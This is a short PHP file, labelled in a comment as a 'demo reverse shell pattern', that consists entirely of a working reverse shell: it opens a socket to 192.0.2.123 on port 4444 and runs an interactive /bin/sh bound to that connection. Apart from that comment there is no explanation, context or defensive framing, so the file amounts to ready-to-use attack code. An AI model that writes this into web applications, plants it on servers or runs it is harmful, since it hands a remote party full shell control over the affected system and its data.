<?php
// demo reverse shell pattern
$sock = fsockopen("192.0.2.123",4444);
exec("/bin/sh -i <&3 >&3 2>&3");
?>
